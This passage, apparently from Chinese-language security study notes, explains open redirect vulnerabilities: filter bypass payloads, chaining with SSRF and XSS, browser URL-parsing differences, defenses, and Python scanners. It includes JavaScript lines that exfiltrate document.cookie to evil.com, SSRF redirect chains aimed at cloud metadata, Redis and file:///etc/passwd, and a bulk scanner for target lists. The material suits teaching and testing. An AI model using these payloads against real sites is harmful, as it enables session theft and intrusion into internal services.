    ExpiresActive On
    ExpiresDefault "access plus 1 year"
    Header set Cache-Control "public, immutable"
</FilesMatch>

```

# 7. Open Redirect 漏洞详解

## 定义

**Open Redirect（开放重定向）** 是指：

> 网站的重定向功能没有做严格限制，攻击者可以控制重定向的目标地址，把用户引导到任意外部网站

简单来说：

```
正常情况：
  用户点击 http://example.com/redirect?url=/profile
  跳转到 http://example.com/profile

攻击情况：
  攻击者构造 http://example.com/redirect?url=https://evil.com
  用户被跳转到 https://evil.com（钓鱼网站）

```

## 危害

- **钓鱼攻击**

```
攻击者发送邮件：
  "您的账户异常，请点击链接验证：
   https://bank.com/redirect?url=https://fake-bank.com"

用户看到域名是 bank.com，觉得安全
点击后被重定向到 fake-bank.com（钓鱼网站）
用户输入账号密码 → 被盗

```

- **绕过SSRF过滤**

```
目标网站存在 SSRF，但过滤了内网地址

攻击者搭建重定向服务器：
  http://attacker.com/redirect → 302 → http://127.0.0.1:6379

让目标请求 http://attacker.com/redirect
目标跟随重定向，访问了内网 Redis

```

- **OAuth劫持**

```
OAuth 登录流程：
  1. 用户点击"用 Google 登录"
  2. 跳转到 Google 授权页面
  3. 授权后，Google 重定向回网站：
     https://example.com/callback?code=xxx

如果 /callback 存在 Open Redirect：
  攻击者构造：
  https://example.com/callback?code=xxx&redirect=https://evil.com

  用户授权后，code 被发送到 evil.com
  攻击者拿到 code，登录用户账户

```

## 常见绕过

- **白名单不严**

**防御代码（错误示例）**

```python
if redirect_url.startswith('https://example.com'):
    return redirect(redirect_url)

```

**绕过**

```
https://example.com.evil.com
https://example.com@evil.com
https://example.com.evil.com/path

```

- **协议相对URL**

**防御代码（错误示例）**

```python
if not redirect_url.startswith('http'):
    return redirect(redirect_url)

```

**绕过**

```
//evil.com

```

- **URL解析差异**

**防御代码(错误示例)**

```python
from urllib.parse import urlparse

parsed = urlparse(redirect_url)
if parsed.netloc == 'example.com':
    return redirect(redirect_url)

```

**绕过**

```
https://example.com\@evil.com
https://example.com%00.evil.com
https://example.com%2f%2fevil.com

```

不同的 URL 解析库对这些边界情况处理不一致

- **多次编码**

```
https://evil.com
→ URL 编码一次：https%3A%2F%2Fevil.com
→ URL 编码两次：https%253A%252F%252Fevil.com

```

### **换行符注入**

（这个没见过，直接上三级标题了）

```
https://example.com%0D%0ALocation:%20https://evil.com

```

某些服务器会把 `%0D%0A`（CRLF）解析成换行，导致 HTTP 响应头注入

## 防御

- **白名单**

```python
ALLOWED_DOMAINS = ['example.com', 'www.example.com']

def safe_redirect(url):
    parsed = urlparse(url)
    
    # 只允许相对路径
    if not parsed.netloc:
        return redirect(url)
    
    # 或者只允许白名单域名
    if parsed.netloc in ALLOWED_DOMAINS:
        return redirect(url)
    
    # 其他情况拒绝
    return redirect('/')

```

- **只允许相对路径**

```python
def safe_redirect(url):

    # 只允许 /xxx 这种相对路径
    if url.startswith('/') and not url.startswith('//'):
        return redirect(url)
    return redirect('/')

```

- **使用ID映射**

```python
REDIRECT_MAP = {
    '1': '/profile',
    '2': '/settings',
    '3': '/logout'
}

def safe_redirect(redirect_id):
    url = REDIRECT_MAP.get(redirect_id, '/')
    return redirect(url)

```

用户只能传 ID，不能直接传 URL

# 8. 重定向与其他漏洞结合

## (1)SSRF与重定向

### 组合利用原因

因为 SSRF 的核心问题是：

> 让服务器替攻击者去请求一个地址

而重定向的核心能力是：

> 告诉客户端“去另一个地址再请求一次”

所以二者结合：

```
攻击者 → 提供一个看起来安全的 URL
目标服务器 → 去请求这个 URL
目标 URL → 返回 30x，把目标服务器引到真正的恶意地址

```

所以重定向经常用来

```
绕过 SSRF 的域名/IP 白名单
绕过协议限制
绕过只检查第一次请求的过滤器
从外网跳到内网
从 http 跳到 file / gopher 等危险协议
探测内网服务

```

### 组合利用的基本思路

```
1. 目标站点存在 SSRF
2. 目标只允许访问某些“看起来安全”的 URL
3. 攻击者控制一个中转服务器
4. 中转服务器第一次返回 302/307/308
5. 目标服务器跟随重定向，最终访问到攻击者想打的地址

```

### 重定向绕过SSRF过滤原因

很多 SSRF 防护做得不完整，常见错误：

- **只检查第一个URL**

```
if url.startswith("http://allowed.com"):
    fetch(url)

```

如果攻击者传入

```
http://allowed.com/redirect

```

然后这个地址返回

```http
HTTP/1.1 302 Found
Location: http://127.0.0.1:8080/

```

服务器如果自动跟随重定向，就会被带到内网地址

- **只校验域名，不校验跳转后的最终地址**

很多系统会做：

```
URL 必须是 http/https
域名必须在白名单
不能是 127.0.0.1
不能是 localhost

```

但如果白名单域名本身可控，或者存在开放重定向，就能把它“洗”到内网

- **只做一次解析**

有些程序只在第一次请求时解析域名，后续跟随重定向时不再检查目标。
这就给了攻击者机会：

```
外网地址 -> 302 -> 内网地址

```

### SSRF + 重定向经典利用链

- **外网跳内网**

攻击者准备一个地址

```
http://attacker.com/r

```

返回

```http
HTTP/1.1 302 Found
Location: http://192.168.1.10:8080/admin

```

如果目标服务会自动跟随重定向，它就会去访问内网管理页面

- **外网跳localhost**

```
http://attacker.com/r -> 302 -> http://127.0.0.1:2375/

```

如果内网机器上跑着 Docker API、Redis、Elasticsearch、Jenkins、Consul 等服务，危害会非常大

- **外网跳file://**

如果目标组件允许某些特殊协议，或者过滤不严：

```
http://attacker.com/r -> 302 -> file:///etc/passwd

```

这就是前面提到的经典 SSRF + 重定向读取本地文件

### SSRF重定向的检测方法

- **观察是否跟随重定向**

准备一个可控站点，让它返回：

```
HTTP/1.1 302 Found
Location: http://your-collaborator.example/

```

如果目标服务器访问了你的 collaborator 地址，说明它会跟随重定向

- **构造多种跳转**

```
A -> B -> C

```

看看目标会不会一路跟下去。
有些系统只跟 1 次，有些会跟多次。

- **测试协议切换**

```
http://attacker.com/r -> 302 -> gopher://127.0.0.1:6379/_...

```

如果系统不严格限制最终协议，就可能出问题

- **测试内网地址与本地地址**

```
http://attacker.com/r -> 302 -> http://127.0.0.1/
http://attacker.com/r -> 302 -> http://169.254.169.254/

```

后者在云环境中特别危险，可能打到元数据服务

### 真实场景的危险目标

- **云主机元数据**

常见于：

```
http://169.254.169.254/

```

如果能访问，可能拿到云环境凭证、实例信息等。

------

- **Redis / Memcached**

如果能打到内网 Redis，可能出现：

```
未授权读写
写入计划任务
getshell
持久化投毒

```

- **Jenkins / Docker / Elasticsearch / Consul**

这些服务如果没做认证或弱认证，SSRF 打进去经常后果严重。

## (2)XSS与重定向

### 关系

二者常见组合

```
重定向入口 + 参数注入 + 浏览器执行脚本

```

- **Open Redirect帮助XSS扩散**

如果网站有开放重定向，攻击者可以把用户导到自己控制的页面，然后在那边继续做 XSS、钓鱼或诱导登录

- **XSS配合重定向窃取信息**

XSS里有行常见代码

```javascript
location.href = "https://evil.com/?c=" + document.cookie

```

也就是说，**重定向动作本身就会成为数据外传手段**

- **某些重定向参数可直接变成脚本执行点**

如果服务端把跳转目标直接插入 HTML/JS，就可能从“重定向漏洞”升级成 XSS

### 常见结合场景

- **JavaScript跳转参数污染**

页面污染

```html
<script>
  location.href = "<?= $_GET['next'] ?>";
</script>

```

如果没有严格转义，攻击者可能构造出：

```
?next=";alert(1);//

```

导致脚本被截断并执行

- **Meta Refresh 注入**

代码：

```html
<meta http-equiv="refresh" content="0;url=<?= $target ?>">

```

如果 `target` 未过滤，可能引发 HTML 注入、属性注入，进一步变成 XSS

- **Location头注入引发二次问题**

如果程序把用户输入直接放进 `Location`，并且没有处理 CRLF，可能出现响应拆分、头注入，进而造成更复杂的攻击链

- **Open Redirect + 钓鱼页 + XSS**

攻击者利用网站本身的可信域名：

```
https://trusted.com/redirect?url=https://evil.com/login

```

用户先信任 trusted.com，然后在 evil.com 页面里被诱导输入信息。
如果再叠加页面上的脚本漏洞，危害更大

### XSS利用重定向外带数据

- **直接跳转到外部站点**

```javascript
location.href = "https://evil.com/?cookie=" + encodeURIComponent(document.cookie)

```

- **带上当前 URL**

```javascript
location.href = "https://evil.com/?u=" + encodeURIComponent(location.href)

```

- **构造表单提交**

```javascript
let f = document.createElement('form');
f.method = 'POST';
f.action = 'https://evil.com/collect';
let i = document.createElement('input');
i.name = 'cookie';
i.value = document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();

```

### 利用链：重定向页+XSS

```
1. 找到网站的跳转参数 next / redirect / returnUrl
2. 发现跳转参数可控
3. 进一步发现页面把参数输出到 HTML 或 JS 中
4. 构造 payload 触发 XSS
5. 利用 XSS 窃取凭证、CSRF token、管理员信息

```

# 9. 浏览器行为差异

```
同一个重定向 Payload，在不同浏览器上表现完全不同
有些绕过技巧只在特定浏览器有效
有些漏洞在 Chrome 能复现，在 Firefox 却不行

因为：
- 不同浏览器对 HTTP 规范的实现有细微差异
- 安全策略不同（CORS、CSP、SameSite）
- URL 解析逻辑不同
- 重定向跟随策略不同
- 协议支持不同

```

## Chrome / Firefox / Safari的重定向跟随策略

### 基本对比

| 特性                     | Chrome     | Firefox    | Safari   |
| ------------------------ | ---------- | ---------- | -------- |
| 自动跟随 301/302         | ✅          | ✅          | ✅        |
| 自动跟随 307/308         | ✅          | ✅          | ✅        |
| 跟随次数限制             | 20 次      | 20 次      | 16 次    |
| 跨协议跳转（http→https） | ✅ 允许     | ✅ 允许     | ✅ 允许   |
| 跨协议跳转（https→http） | ⚠️ 警告     | ⚠️ 警告     | ⚠️ 警告   |
| 跳转到 file://           | ❌ 禁止     | ❌ 禁止     | ❌ 禁止   |
| 跳转到 javascript:       | ❌ 禁止     | ❌ 禁止     | ❌ 禁止   |
| 跳转到 data:             | ⚠️ 部分限制 | ⚠️ 部分限制 | ❌ 更严格 |

### 重定向次数限制

 **Chrome：**

```
最多跟随 20 次重定向
超过后显示：ERR_TOO_MANY_REDIRECTS

```

**Firefox：**

```
最多跟随 20 次重定向
超过后显示：The page isn't redirecting properly

```

**Safari：**

```
最多跟随 16 次重定向
超过后显示：Too many redirects

```

## 浏览器对跨协议跳转的限制

### http -> https

所有浏览器都允许从 http 跳转到 https，这是安全的升级

```http
HTTP/1.1 301 Moved Permanently
Location: https://example.com/

```

✅ 正常跳转，无警告

### https -> http

从 https 跳转到 http 是"降级"，浏览器会警告

```http
HTTP/1.1 302 Found
Location: http://example.com/

```

⚠️ Chrome 会显示"不安全"警告
⚠️ Firefox 会提示"连接不安全"

### 跳转到file://

现代浏览器都禁止从网页跳转到本地文件：

```http
HTTP/1.1 302 Found
Location: file:///etc/passwd

```

❌ Chrome：ERR_UNSAFE_REDIRECT
❌ Firefox：Blocked redirect to file://
❌ Safari：直接忽略

### 跳转到javascript:

```http
HTTP/1.1 302 Found
Location: javascript:alert(1)

```

❌ 所有浏览器都会阻止，不会执行脚本

### 跳转到data:

```http
HTTP/1.1 302 Found
Location: data:text/html,<script>alert(1)</script>

```

- Chrome：部分场景允许，但有 CSP 限制
- Firefox：部分场景允许
- Safari：更严格，大多数情况禁止

## SameSite Cookie与重定向的关系

### 是什么

SameSite 是 Cookie 的一个属性，用于防止 CSRF 攻击

```http
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None; Secure

```

### 对重定向的影响

**SameSite=Strict：**

```
跨站重定向时，Cookie 不会被发送

```

示例

```
用户在 evil.com 点击链接：
  <a href="https://bank.com/transfer?to=attacker">点我</a>

如果 bank.com 的 Cookie 设置了 SameSite=Strict
那么这次请求不会带上 session Cookie
攻击失败

```

**SameSite=Lax（默认）：**

```
顶级导航（地址栏变化）时，Cookie 会被发送
但 POST 请求、iframe、img 等不会发送

```

示例

```
用户点击链接跳转到 bank.com → Cookie 会发送 ✅
通过 <img src="bank.com/..."> → Cookie 不会发送 ❌

```

**SameSite=None：**

````
所有情况都发送 Cookie
但必须配合 Secure（只在 HTTPS 下生效）

````

### 浏览器对SameSite的默认行为

| 浏览器      | 默认 SameSite 策略 |
| ----------- | ------------------ |
| Chrome 80+  | Lax                |
| Firefox 69+ | Lax                |
| Safari 13+  | Lax                |
| Edge 86+    | Lax                |

```
如果开发者没有显式设置 SameSite
浏览器会自动使用 Lax
很多老的 CSRF 攻击已经失效

```

## CORS与重定向的交互

### 跨域请求 + 重定向的问题

如果一个跨域请求遇到重定向，可能出现问题：

```javascript
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include'
})

```

如果 `api.example.com` 返回：

```http
HTTP/1.1 302 Found
Location: https://cdn.example.com/data

```

浏览器会：

1. 跟随重定向到 `cdn.example.com`
2. 但如果 `cdn.example.com` 没有正确的 CORS 头
3. 请求会失败

### 不同浏览器的处理差异

**Chrome / Firefox：**

```
跨域请求遇到重定向时
会检查最终目标的 CORS 头
如果不匹配，请求失败

```

**Safari（老版本）：**

```
某些版本的 Safari 对重定向后的 CORS 检查不严格
可能导致安全问题

```

## 浏览器对URL解析的差异

### 反斜杠 vs 正斜杠

**测试 URL：**

```
https://example.com\@evil.com

```

- Chrome：解析为 `evil.com`（把 `\` 当成 `/`）
- Firefox：解析为 `example.com`（把 `\` 当成普通字符）
- Safari：解析为 `example.com`

这导致某些 Open Redirect 绕过只在 Chrome 有效。

### @符号的处理

**测试 URL：**

```
https://example.com@evil.com

```

- Chrome：跳转到 `evil.com`（@ 前面是用户名）
- Firefox：跳转到 `evil.com`
- Safari：跳转到 `evil.com`

但如果是：

```
https://example.com:@evil.com

```

某些浏览器可能解析失败。

### 双斜杠处理

**测试 URL：**

```
//evil.com

```

所有浏览器都会自动补全协议（http 或 https），这是标准行为。

但如果是：

```
///evil.com

```

- Chrome：解析为 `file:///evil.com`（本地路径）
- Firefox：解析为 `file:///evil.com`
- Safari：可能拒绝

## 利用浏览器差异绕过防御

- **Chrome 特有的反斜杠绕过**

目标网站的防御代码：

```
from urllib.parse import urlparse

def is_safe_redirect(url):
    parsed = urlparse(url)
    return parsed.netloc == 'example.com'

```

Python 的 `urlparse` 会把 `\` 当成普通字符，所以：

```
urlparse('https://example.com\\@evil.com').netloc

# 返回：'example.com\\@evil.com'

# 不等于 'example.com'，被拒绝

```

但如果用户用 Chrome 访问：

```
https://example.com/redirect?url=https://example.com\@evil.com

```

Chrome 会把 `\` 当成 `/`，最终跳转到 `evil.com`。

- **Safari 的 data: 协议限制更严**

某个 XSS Payload 在 Chrome 有效：

```
https://example.com/redirect?url=data:text/html,<script>alert(1)</script>

```

但在 Safari 上被阻止。

攻击者需要针对不同浏览器准备不同 Payload。

## Python

- **基础检测脚本**

```python
import requests
from urllib.parse import urljoin

# 常见的重定向参数名
REDIRECT_PARAMS = [
    'url', 'redirect', 'next', 'target', 'goto', 'return',
    'returnUrl', 'callback', 'continue', 'dest', 'destination',
    'redir', 'redirect_uri', 'out', 'view', 'to', 'link'
]

# 测试 Payload
TEST_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    'https://evil.com@target.com',
    'https://target.com@evil.com',
    'https://target.com\\@evil.com',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>'
]

def test_open_redirect(base_url):
    """测试单个 URL 的 Open Redirect"""
    results = []
    
    for param in REDIRECT_PARAMS:
        for payload in TEST_PAYLOADS:

            # 构造测试 URL
            test_url = f"{base_url}?{param}={payload}"
            
            try:

                # 发送请求，不自动跟随重定向
                response = requests.get(
                    test_url,
                    allow_redirects=False,
                    timeout=5
                )
                
                # 检查是否是重定向响应
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    # 检查是否跳转到恶意地址
                    if 'evil.com' in location or 'javascript:' in location:
                        results.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'location': location,
                            'status': response.status_code
                        })
                        print(f"[+] 发现漏洞: {test_url}")
                        print(f"    跳转到: {location}")
```

- **增强批量检测**

```python
import requests
import concurrent.futures
from urllib.parse import urljoin, urlparse

class OpenRedirectScanner:
    def __init__(self, targets_file, output_file='results.txt'):
        self.targets = self.load_targets(targets_file)
        self.output_file = output_file
        self.vulnerabilities = []
        
    def load_targets(self, filename):
        """从文件加载目标 URL"""
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def test_single_target(self, url):
        """测试单个目标"""
        PARAMS = ['url', 'redirect', 'next', 'target']
        PAYLOAD = 'https://evil.com'
        
        for param in PARAMS:
            test_url = f"{url}?{param}={PAYLOAD}"
            
            try:
                resp = requests.get(
                    test_url,
                    allow_redirects=False,
                    timeout=5,
                    headers={'User-Agent': 'Mozilla/5.0'}
                )
                
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    
                    if 'evil.com' in location:
                        vuln = {
                            'url': test_url,
                            'location': location,
                            'status': resp.status_code
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[+] {test_url} -> {location}")
                        
            except:
                pass
    
    def scan(self, threads=10):
        """多线程扫描"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.test_single_target, self.targets)
        
        self.save_results()
    
    def save_results(self):
        """保存结果"""
        with open(self.output_file, 'w') as f:
            for vuln in self.vulnerabilities:
                f.write(f"{vuln['url']} -> {vuln['location']}\n")
        
        print(f"\n[*] 发现 {len(self.vulnerabilities)} 个漏洞")
        print(f"[*] 结果已保存到 {self.output_file}")

# 使用示例
if __name__ == '__main__':
    scanner = OpenRedirectScanner('targets.txt')
    scanner.scan(threads=20)
```

## 自动化重定向链追踪脚本

```python
import requests

def trace_redirects(url, max_hops=10):
    """追踪完整的重定向链"""
    chain = []
    current_url = url
    
    for i in range(max_hops):
        try:
            response = requests.get(
                current_url,
                allow_redirects=False,
                timeout=5
            )
            
            chain.append({
                'hop': i + 1,
                'url': current_url,
                'status': response.status_code,
                'location': response.headers.get('Location', '')
            })
            
            # 如果不是重定向，结束
            if response.status_code not in [301, 302, 303, 307, 308]:
                break
            
            # 获取下一跳地址
            location = response.headers.get('Location')
            if not location:
                break
            
            # 处理相对路径
            if location.startswith('/'):
                from urllib.parse import urljoin
                current_url = urljoin(current_url, location)
            else:
                current_url = location
                
        except Exception as e:
            chain.append({
                'hop': i + 1,
                'url': current_url,
                'error': str(e)
            })
            break
    
    return chain

# 使用示例
if __name__ == '__main__':
    url = 'https://example.com/redirect?url=https://evil.com'
    chain = trace_redirects(url)
    
    print("重定向链：")
    for hop in chain:
        print(f"  [{hop['hop']}] {hop['url']}")
        if 'status' in hop:
            print(f"      状态码: {hop['status']}")
            print(f"      跳转到: {hop.get('location', 'N/A')}")
        if 'error' in hop:
            print(f"      错误: {hop['error']}")

```
